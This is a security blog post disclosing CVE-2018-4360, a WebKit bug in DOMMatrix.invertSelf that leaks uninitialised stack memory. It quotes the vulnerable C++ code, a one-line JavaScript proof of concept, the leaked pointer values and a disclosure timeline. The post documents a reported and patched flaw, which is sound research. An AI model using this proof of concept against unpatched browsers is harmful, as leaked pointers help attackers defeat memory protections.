<!DOCTYPE html>
<html lang="en-US">

<head>
  <meta charset='utf-8'>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width,maximum-scale=2">
  <link rel="stylesheet" type="text/css" media="screen"
    href="/assets/css/style.css?v=254ec4f76e4cc22c380037c8ba0d300661142d2d">

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>CVE-2018-4360 - WebKit Information Leak with DOMMatrix.invertSelf | devcraft.io</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="CVE-2018-4360 - WebKit Information Leak with DOMMatrix.invertSelf" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="While playing around with domato and WebKit, I came across an interesting crash when calling invertSelf on a DOMMatrix. The bug was in the following code (Source/WebCore/css/DOMMatrix.cpp):" />
<meta property="og:description" content="While playing around with domato and WebKit, I came across an interesting crash when calling invertSelf on a DOMMatrix. The bug was in the following code (Source/WebCore/css/DOMMatrix.cpp):" />
<link rel="canonical" href="https://devcraft.io/2019/02/19/cve-2018-4360-webkit-information-leakage-with-dommatrixinvertself.html" />
<meta property="og:url" content="https://devcraft.io/2019/02/19/cve-2018-4360-webkit-information-leakage-with-dommatrixinvertself.html" />
<meta property="og:site_name" content="devcraft.io" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-02-19T22:21:03+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="CVE-2018-4360 - WebKit Information Leak with DOMMatrix.invertSelf" />
<script type="application/ld+json">
{"description":"While playing around with domato and WebKit, I came across an interesting crash when calling invertSelf on a DOMMatrix. The bug was in the following code (Source/WebCore/css/DOMMatrix.cpp):","url":"https://devcraft.io/2019/02/19/cve-2018-4360-webkit-information-leakage-with-dommatrixinvertself.html","@type":"BlogPosting","headline":"CVE-2018-4360 - WebKit Information Leak with DOMMatrix.invertSelf","dateModified":"2019-02-19T22:21:03+00:00","datePublished":"2019-02-19T22:21:03+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://devcraft.io/2019/02/19/cve-2018-4360-webkit-information-leakage-with-dommatrixinvertself.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

</head>

<body>

  <!-- HEADER -->
  <div id="header_wrap" class="outer">
    <header class="inner">
      <a id="site_link" href="/">
        <h1 id="project_title">devcraft.io</h1>
      </a>
      <h2 id="project_tagline"><p>CTF write ups by <a href="https://twitter.com/wcbowling">vakzz</a></p>
</h2>
      
    </header>
  </div>

  <!-- MAIN CONTENT -->
  <div id="main_content_wrap" class="outer">
    <section id="main_content" class="inner">
      <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">
      CVE-2018-4360 - WebKit Information Leak with DOMMatrix.invertSelf
    </h1>
    <p class="post-meta">
      <time
        datetime="2019-02-19T22:21:03+00:00"
        itemprop="datePublished"
        >Feb 19, 2019</time
      >
    </p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p>While playing around with <a href="https://github.com/googleprojectzero/domato">domato</a> and WebKit, I came across an interesting crash when calling <code class="language-plaintext highlighter-rouge">invertSelf</code> on a <code class="language-plaintext highlighter-rouge">DOMMatrix</code>. The bug was in the following code (<a href="https://github.com/WebKit/webkit/blob/3f2a2d3c748d1b13116717c104410fd32e79d5cc/Source/WebCore/css/DOMMatrix.cpp#L229">Source/WebCore/css/DOMMatrix.cpp</a>):</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Ref</span><span class="o">&lt;</span><span class="n">DOMMatrix</span><span class="o">&gt;</span> <span class="n">DOMMatrix</span><span class="o">::</span><span class="n">invertSelf</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">auto</span> <span class="n">inverse</span> <span class="o">=</span> <span class="n">m_matrix</span><span class="p">.</span><span class="n">inverse</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">inverse</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">m_matrix</span><span class="p">.</span><span class="n">setMatrix</span><span class="p">(</span>
            <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span>
            <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span>
            <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span>
            <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">(),</span> <span class="n">std</span><span class="o">::</span><span class="n">numeric_limits</span><span class="o">&lt;</span><span class="kt">double</span><span class="o">&gt;::</span><span class="n">quiet_NaN</span><span class="p">()</span>
        <span class="p">);</span>
        <span class="n">m_is2D</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">m_matrix</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">.</span><span class="n">value</span><span class="p">();</span>
    <span class="k">return</span> <span class="n">Ref</span><span class="o">&lt;</span><span class="n">DOMMatrix</span><span class="o">&gt;</span> <span class="p">{</span> <span class="o">*</span><span class="k">this</span> <span class="p">};</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This issue is that inverting <code class="language-plaintext highlighter-rouge">m_matrix</code> can fail and set <code class="language-plaintext highlighter-rouge">inverse</code> to a nullopt, but <code class="language-plaintext highlighter-rouge">inverse.value()</code> is still always called overwriting the NaN values with an uninitialised pointer. This will fill up the matrix with random data from the stack, which we can then access:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="k">new</span> <span class="nx">DOMMatrix</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]).</span><span class="nx">invertSelf</span><span class="p">())</span>
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DOMMatrix:
  a: 2.3236913163e-314
  b: 6.9529314086834e-310
  c: 0
  d: 2.121995918e-314
  e: 2.2541024625e-314
  f: 6.9531249123115e-310
  is2D: false
  isIdentity: false
  m11: 2.3236913163e-314
  m12: 6.9529314086834e-310
  m13: 2.2560109e-314
  m14: 2.2561725264e-314
  m21: 0
  m22: 2.121995918e-314
  m23: 2.3487948945e-314
  m24: 2.2541024625e-314
  m31: 2.256111357e-314
  m32: 2.3217606737e-314
  m33: 2.2560109e-314
  m34: 2.2541024625e-314
</code></pre></div></div>

<p>After converting to Int64s using the wonderful scripts from <a href="https://github.com/saelo/jscpwn/">https://github.com/saelo/jscpwn/</a>:</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mh">0x00007fff18553185</span>
<span class="mh">0x0000000100000101</span>
<span class="mh">0x00007ffff961eb70</span>
<span class="mh">0x00007fff18553185</span>
<span class="mh">0x00000002205adf60</span>
<span class="mh">0x0000000100000101</span>
<span class="mh">0x000000022b4c7e60</span>
<span class="mh">0x0000000228479bb0</span>
<span class="mh">0x00000002201af0c0</span>
</code></pre></div></div>

<p>The reason that this started crashing was due to the changes made to <a href="https://bugs.webkit.org/show_bug.cgi?id=187669">WTF’s internal std::optional</a> which caused any invalid access to crash instead of using the uninitialised value.</p>

<p>Timeline:</p>
<ul>
  <li>Jul 4, 2018 - Reported to Apple</li>
  <li>Jul 6, 2018 - Acknowledgement from Apple</li>
  <li>Jul 9, 2018 - Fix commited to svn</li>
  <li>Sep 17, 2018 - iOS and Safari updated</li>
</ul>

<p>References:</p>

<ul>
  <li><a href="https://github.com/WebKit/webkit/commit/a0b0e01648892b0bb60a01aca619eec85eb27f7a">WebKit/webkit#a0b0e016</a></li>
  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-4360">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-4360</a></li>
  <li><a href="https://support.apple.com/en-au/HT209106">https://support.apple.com/en-au/HT209106</a></li>
</ul>

  </div>

  

  <div id="disqus_thread"></div>
  <script>
    var disqus_config = function() {
      this.page.url = "https://devcraft.io/2019/02/19/cve-2018-4360-webkit-information-leakage-with-dommatrixinvertself.html";
      this.page.identifier = "https://devcraft.io/2019/02/19/cve-2018-4360-webkit-information-leakage-with-dommatrixinvertself.html";
    };
    (function() {
      var d = document,
        s = d.createElement("script");
      s.src = "https://devcraft-2.disqus.com/embed.js";
      s.setAttribute("data-timestamp", +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
  <noscript
    >Please enable JavaScript to view the
    <a href="https://disqus.com/?ref_noscript" rel="nofollow"
      >comments powered by Disqus.</a
    ></noscript
  >
  
</article>

    </section>
  </div>

  <!-- FOOTER  -->
  <div id="footer_wrap" class="outer">
    <footer class="inner">
      

    </footer>
  </div>

  
  <script>
    (function (i, s, o, g, r, a, m) {
      i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
        (i[r].q = i[r].q || []).push(arguments)
      }, i[r].l = 1 * new Date(); a = s.createElement(o),
        m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
    ga('create', 'UA-74386578-2', 'auto');
    ga('send', 'pageview');
  </script>
  
</body>

</html>